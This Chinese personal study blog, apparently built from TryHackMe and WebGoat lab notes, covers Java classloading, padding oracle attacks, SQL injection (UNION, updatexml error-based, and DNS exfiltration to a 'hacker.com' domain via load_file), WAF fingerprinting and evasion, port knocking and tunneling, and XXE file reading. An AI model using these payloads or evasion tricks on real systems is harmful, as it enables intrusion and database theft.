发表于 2026-06-12

双亲委派

当一个类加载器收到某个类加载请求时，该类加载器首先会把请求委派给父类加载器。每个类加载器都是如此，它会先委托父类加载器在自己的搜索范围内找不到对应的类时，该类加载器才会尝试自己去加载。

先从下往上走到最顶部，然后再往下走。从最顶部开始谁把类给加载了，就结束了。

这个父类是逻辑上的父类，他们之间是没有继承关系的。

Bootstrap ClassLoader （启动类加载器）

启动类加载器负责加载$JAVA_HOME中jre/lib/rt.jar里面所有的class，由c++实现，不是classLoader子类

ExtensionClassLoader（扩展类加载器）

扩展类加载器由sun.misc.Launcher $ExtClassLoader实现，负责加载JRE的扩展目录，lib/ext或者由java.ext.dirs系统属性指定的目录中的JAR包的类。由Java语言实现，父类加载器为null。

App ClassLoader（应用类加载器）

由sun.misc.Launcher $App-ClassLoader实现负，记载classpath中指定的jar包以及目录中class， 程序员一般会直接使用这个类加载器，如果程序员没有定义自己的类加载器，就作为应用程序的默认加载器。

User ClassLoader（自定义类加载器）

大家开发的时候其实绝大多数都是使用应用类加载器，针对一些应用类加载器不能满足的情况下，可以考虑使用自定义类加载器，来满足实际开发的业务要求。

paddingoracle

发表于 2026-06-11

在分组加密算法中会进行分组。他的分组机制是这样子的，假如每一个分组的大小是8字节，将原文按8字节分组，这样就会有两种情况，一是能整除，二是没发整除。

1.能整除: 能整除的时候也是会进行填充的，他会在最后再整一个分组添满0x08。

2.不能整除: 显然最后一个分组不够，会对最后一个分组填充，缺一个补一个0x01，缺两个补两个0x02以此类推。

分完组以后就是加密了。

加密过程: 第一个分组与初始向量进行异或运算，将中间值使用密钥加密。第二个分组与第一个分组的加密密文进行异或运算，然后将中间值使用密钥加密。第三个分组与第二个分组的加密密文进行异或运算，然后将中间值使用密钥加密。以此类推。

解密过程: 第一组密文使用密钥解密获得中间值，将中间值与初始向量进行异或运算获得第一组明文。第二组密文使用密钥解密获得中间值，将中间值与第一组密文进行异或运算获得第二组明文。第三组密文使用密钥解密获得中间值，将中间值与第二组密文进行异或运算获得第三组明文。以此类推。

这个漏洞的目的是，能否在不获得密钥的情况下，明文是自己想要的。

利用的是发送的密文解密以后，服务器的响应会有所不同。

比如:收到有效密文的时候，响应200

收到无效密文的时候，响应500

收到一个有效密文，但是解密为无效值时，显示自定义错误信息。

有点像sql盲注。

这个密文解密以后，是否有效是看最后一个分组的最后一个字节。我们知道最后一个分组的最后一个字节只可能是0x01-0x08所以，所以检查最后一个字节是不是在这个范围内就可以了，同时还得满足0x01这种字节数数的数量跟他的值相匹配。

初始向量和字节码是我们可以控制的

漏洞利用: 最后一组密文用密钥解密后的中间值与上一组的密文进行异或运算后会得到明文，而这个明文是最后一组所以他的最后一个字节只可能是0x01-0x08，如果不是，服务器返回回来的是自定义信息错误，所以我们可以反复修改最后一组的上一组密文，直到解密后的最后一组明文是0x01这时服务器返回的消息是不同，这样我们就知道，此时的密文与中间值进行异或运算获得的是0x01，这样就能逆推出中间值的最后一个字节。以此类推知道推出所有中间值。所以说我们每次发密文和一个初始向量，爆破出中间值。

这种方式我们可以进行这些操作: 1.我获得了密文，我想要将其破解。我可以发送初始向量以及一组密文，最后一组是有填充数据的，我们可以用最后一组密文。

利用漏洞我们就知道了，最后一组密文的明文了。最后一组的上一组密文是没有填充数据的，既然如此就添加一个填充数据不就行了吗。我们发送的的是初始向量一组密文，所以说这一组密文是最后一组密文，必然有填充数据，但由于我们是截取的他没有填充数据这会有问题嘛？并没有。因为本质上我们想要的是中间值。我把所有分组的中间值给求出来以后，每一个中间值与上一组的密文进行异或运算就求出来明文了。所以说依然利用漏洞，让最后一个字节的解出来的明文成为0x01，以此类推，最后我们就知道明文是什么了。

  1. 我想要构造合法的密文。我现在有我希望在服务器端解出来的明文。我么使用一组任意的8字节的字节码和初始向量一起发过去，爆破出中间值，知道了中间值就可以通过调整初始向量让他异或以后变成我想要的明文。将这个初始向量作为密文和一个初始向量发过去，爆破中间值，获得中间值调整初始向量。以此类推。

union select联合查询:

select first_name from user_system_data union select login_count from user_data;

联合查询要满足两个条件

1.union前面select的数量和union后面select的数量要相同。

也就是说select 1，2 from user union select 3，4 from password； 这样是可以的

select 1，2，3 from user union select 4，5 from password； 这样是不行的

2.查询的数据类型要相匹配

可以是用order by来查清楚union前面select了几个。

order by后面是可以写数字的，数字代表了第几列。

也就是说order by 1的话就会按第一列排序，order by 2的话就会按第二列排序，order by 3的时候列数是不够的，数据库就会报错了，列数够的话就不会报错。

所以我们就可以通过这个反应知道有几列。

还有一种方式是使用NULL，也就是union select NULL— -，union select NULL，NULL— -以此类推，这样就能知道有几列了。这主要是因为NULL对于各种数据类型是兼容的。NULL的另一个用处就是知道每一列对应的数据类型，我们可以这样，在知道了有几列以后，union select ‘a’,NULL,NULL— -通过一个个的不断调整数据类型，直到匹配上，我们就知道数据类型是什么了。（注意这里的注释需要写成— -必须有这个空格，要不然会把—认为是字段）

联合查询的一大用处就是可以查其他表的感兴趣的内容，还有一个就是可以使用返回对应数据类型的函数。

例如

database()：获取当前数据库名。

user()：获取当前数据库用户名。

version()：获取数据库版本。

SELECT id, title, content FROM articles WHERE id = 1 UNION SELECT 1, database(), version()– -

group_concat():联合查询的时候如果只显示一行的话就可以用这个函数，他会列指定的列里数据全部以一行的形式展示出来（其实不是全部由大小限制）。

任何人在 MySQL 中创建的每一个数据库、每一张表、每一个字段，都会被 MySQL 自动记录在一个叫 information_schema 的系统自带库里。

你可以把它理解为数据库的中央档案馆。其中有两张表是黑客的财富密码：

  • information_schema.tables：记录了整个 MySQL 里面所有的表名。
  • information_schema.columns：记录了整个 MySQL 里面所有的列名（字段名）。

在这张地图里，有两个核心字段需要认清：

  • table_schema：代表这张表属于哪个数据库。
  • table_name：代表这张表的表名。

如果我们在普通的数据库命令行里，想查出 security 这个数据库里有哪些表，我们会写这样一句标准的 SQL：

SELECT table_name FROM information_schema.tables WHERE table_schema = 'security';

联合查询中的应用:

-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = database()-- -

报错注入

黑客故意输入错误的语法，强行引发数据库报错；但黑客在这段语法里塞了“私货”（比如查密码的命令），导致数据库在报错信息中，不小心把黑客想要的秘密给一起打印在屏幕上了。

要想使用这个漏洞需要满足两个条件:

后端代码太粗心： 网站的开发人员没有关闭数据库的“错误回显”。程序在出错时，会毫无遮掩地把数据库报的错误原封不动地打印在网页上（例如：MySQL Error: …）。

利用了特定函数的逻辑漏洞： 数据库中有些函数，当接收到不符合规范的参数时，会把这个参数的内容直接放进报错信息里弹出来。

updatexml(参数1, 参数2, 参数3):其中第二个参数要求必须是一个合法的 XPath 格式路径（类似于文件夹路径，比如 /root/user)

– 故意制造路径错误的 Payload,塞进一个绝对不符合 XPath 路径规范的特殊字符（比如波浪号 ~），紧接着在后面拼接上想偷的数据（如 database()）。

?id=1’ AND updatexml(1, concat(‘~’, database()), 1) –+

数据库会这样回答:ERROR 1105 (HY000): XPATH syntax error: ‘~security’

?id=1’ AND updatexml(1, concat(‘~’, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)), 1) –+可以这么用

updatexml 报错注入，报错的回显最多为32位

带外sql注入

当网站做到了极致的防御：网页上不显示任何数据（无法 Union），不显示任何报错（无法报错注入），甚至还加了严格的频率限制（一旦你用盲注高频猜解，IP立刻被拉黑）。

这时候，黑客就会利用带外通道：让受害服务器的数据库自己主动联网，把数据发送到黑客掌控的另一台外部服务器上。

利用数据库自带的、可以发起网络请求的内置函数。最常被用来建立这种“带外通道”的协议是 DNS（域名系统）。

MySQL 数据库在 Windows 服务器环境下（必须是windows）

在 Windows 系统中，如果你尝试访问一个形如 \xxx.com\abc 的网络共享路径（称为 UNC 路径），系统为了解析 xxx.com 在哪里，会强制发送一个 DNS 请求。 MySQL 的 load_file() 函数正好支持读取网络路径。

控制了hacker.com

?id=1’ AND load_file(concat(‘\\‘, (SELECT database()), ‘.hacker.com\abc’)) —+(在 SQL 语法中，反斜杠 \ 是一个特殊的“转义符”。它的作用是改变紧跟在它后面的那个字符的原本含义。 例如：' 意味着“这只是一个普通的单引号字符，不是字符串的边界”。所以写了四个)

concat会讲它拼成\数据库名称.hacker.com\abc

load_file() 尝试去读取这个路径。为了找到这个路径，受害服务器开始查 DNS。

解释一下DNS解析：

当受害服务器大喊：“谁知道 security.hacker.com 的 IP 是多少？”时，全球的 DNS 解析网络开始了一场接力赛：

  1. 第一步：询问“根域名服务器” DNS 问：“哪里能找到 .com 区域？” 根服务器回答：“我知道，去 .com 的顶级域名服务器找。”
  2. 第二步：询问 .com 顶级域名服务器 DNS 问：“哪里能找到 hacker.com？” .com 服务器查了查档案（黑客注册域名时的记录），回答：“这个域名被黑客买下了，他自己搭了一台权威 DNS 服务器来管理，IP 是 X.X.X.X。你去问他吧！”
  3. 第三步：致命的一步，流量直接进入黑客的服务器 全球的 DNS 系统于是转头去问黑客的这台服务器（X.X.X.X）：“喂，你家主人买的 hacker.com 下面，有一个叫 security 的子域名，它的 IP 是多少？”

为什么要编码

为了区分特殊字符在特定情况下的意思不同，例如HTML中的<他是一个标签的开始，但也可以是小于的意思，为了区分就会使用编码，像这样&lt;，编码以后就是字面意思了。

用编码绕过

例如我们想要绕过WAF，就sql注入代码进行编码，WAF看到的是编码后的字面量，WAF没有识别出来，到了服务器又将这个编码给解码了，将解码后的拼接以后将sql语句进行解析。编码和解码是相对应的，如果我们编码以后的数据不被解码就没办法发挥了。

Web Application Firewall(WAF)

用途

检查HTTP(S)流量，包括入站和出站流量，检测出有恶意意图的流量。主要解决OWASP Top 10 Web安全问题。

检查

无论怎么样肯定得知道有没有WAF吧。下面我列举一些检查是否有WAF的方法

一些WAF在HTTP标头中的形式

server: cloudflare Cloudflare

X-Sucuri-ID Sucuri

X-CDN: Imperva Incapsula/Imperva

Akami-Origin-Hop: 2 Akamai

X-F5-Application: ASM F5 Advanced WAF

检测方法1: 很简单就是看HTTP标头 curl -I https://example.com

检测方法2: ‘ OR ‘1’=’1 – 是很典型的sql注入，可以想到是个WAF就会对他进行处理，而我们要做的就是这样的sql注入，然后看他的反应。

例如 curl -I https://example.com/q=1‘ %20OR%20‘1’=‘1 对空格编码

如果返回的是 HTTP/1.1 403 Forbidden这样的说明有WAF

回复 意思
403 Forbidden 空白页 经典的WAF块
406 Not Acceptable ModSecurity CRS中的常见情况
自定义 HTML页面，显示“拒绝访问” 厂商特定(例如 Fortinet,Barracuda)
响应延迟(>500ms) WAF开销
与正常搜索一样 可能没有WAF

检测方法3: 用工具wafw00f

wafw00f https://example.com

用nmap

Nmap -p 80,443 –script http-waf-fingerprint target_IP

tryhackme说是wafw00f更好

类型

1.基于特征的

将数据包与已知的恶意特征码列表进行比较，有效性取决于恶意特征码数据库。

规避方法

编码: 跟我上面写的sql注入一样，编码空格啥的

大小写: uNiOn sELeCt 像这样

插入注释: 插入注释

更换语法: 1’ and sleep(5) – 1’ and if(1=1, sleep(5), 1) –

优点: 低误报率(误报率就是将正常流量识别为恶意流量)，易于编写和理解，检测速度快

缺点: 难以识别混淆手段(上述规避方法)，无法检测零日攻击，需要不断更新

2.检测行为

经过训练的引擎，建立一个正常基线，偏离了这个基线就是不正常的流量。

优点: 可以防止零日漏洞，用简单的编码方式更难绕过，随着时间推移适应应用程序逻辑

缺点: 误报率高，需要培训期，计算成本高昂

局限性

WAF不理解应用程序逻辑

以IDOR漏洞举例，GET /api/user/123 我们把123改成124是恶意行为但是WAF不会拦截。因为/api/user/124本身是很正常的，他变得不安全是因为访问这个地址的人的身份。

授权绕过: 例如/admin,无需管理员权限就可以访问

静态条件和重放攻击

加密流量也不行，加密了所以看不到流量了。

客户端攻击难以察觉，例如给予DOM的XSS攻击，这个是传客户端攻击，流量不会到服务器。

利用端口跳跃

我是在tryhackme上学的这部分，没太看懂，下面这个是我文AI知道的。

这是在控制了对方的服务器的情况下，防止因为频繁的流量交流被防火墙检测到。

端口跳跃就是在防火墙允许的端口间频繁切换(时间很短)，从而防止长时间在固定端口上交流。

有两种方式

1.基于时间/算法同步

通信的两端共享一个密钥和时间同步算法。算法决定“在第 1 毫秒用 5001 端口，第 2 毫秒用 6234 端口，第 3 毫秒用 4012 端口….

2.敲暗号

服务端的所有端口默认全部死死关闭，防火墙对其显示为 Filtered

客户端在建立真正连接前，必须先向服务端一连串指定的端口发送特定序列的探测包。

例如暗号是：先踩一下 1111，再踩一下 9999，最后踩一下 5555。

服务端的内核态（或敲门守护进程）一旦捕捉到这个特定序列的“暗号”，就会临时为这个特定的客户端 IP 开启真正的通信端口。通信完后，立刻再度关闭。也就是说我放进去的后门可以看到流量被拒绝了，一看到一串的特定流量被拒绝了就打开端口。

利用端口隧道

还是控制了对方的服务器的情况下。我想要吧流量送到对方的另一台服务器上，或者是这台受控机器的另一个端口(我们的流量没有办法直接传过去，防火墙挡掉了)。防火墙阻止来自不信任网络的80端口流量，但是8008的流量并未被阻止。我们可以把流量发到受控机器的8008端口，再让他把流量转发给另一个机器或端口。

XML external entity injection

漏洞成因

有这种漏洞就是因为后端对xml没有限制，具体是什么限制后面写，所以说利用的肯定是xml的一些语法特性。

XML语法

但其实就是DTD部分

主要关注DTD

在[]里面有ENTITY js “Jo Smith”

js就是变量 Jo Smith就是变量的值

&js 就会变成Jo Smith

主要关注SYSTEM

SYSTEM 是一个强力关键字，它的核心作用就是：告诉 XML 解析器去“外包”或者“搬运”外部的资源。

也就是说它会从后面附上的地址那数据。

也就说&js会得到/etc/passwd这个文件里面的数据。

而这个xml是传给后端的，所以这个文件就是后端的文件。

很显然这个SYSTEM关键字是不安全的应该禁止

变量的两种形式

  • 通用实体

也就是我们在刚才一直用的形式，如图file就是变量

他的变量在DTD中是不会解析的

  • 参数实体

先看对变量进行定义的方法，他是通过& 变量名 的形式定义的（注意&和变量名之间有空格）

对于变量的引用是通过&变量名。

核心就是，变量的引用是在DTD里进行的。

那这个参数实体在哪里会用到呢？

他会在XXE盲注中用到

首先了解一下什么是盲注，盲注就是没有回显。

举个例子，上面的例子中的/etc/passwd文件里面的数据我们希望看到，比如说显示在前端页面什么的，但是对方后端在处理完之后没有将数据传给前端，或者只显示xml解析成功之类的，总之我们看不到数据。

所以我们希望可以看到数据，既然对方的前端页面不会显示数据，我们就让他把数据传给我们，如图

这个webwolf就是我们的服务器

%file获取数据，添加给send的值里面

%send就会将这个http协议给解析了，也就是访问这个http地址，这样我们的服务器就可以通过参数的形式看到数据了。

但是，参数实体在变量的值里面是不能这么写的，因为xml解析器看到这种语法的话会直接报错罢工，也就是说%file没用。

还有但是，在外部 DTD 文件（即通过网络或者本地路径引入的独立 .dtd 文件）中，参数实体允许进行自由的嵌套、拼接和调用。
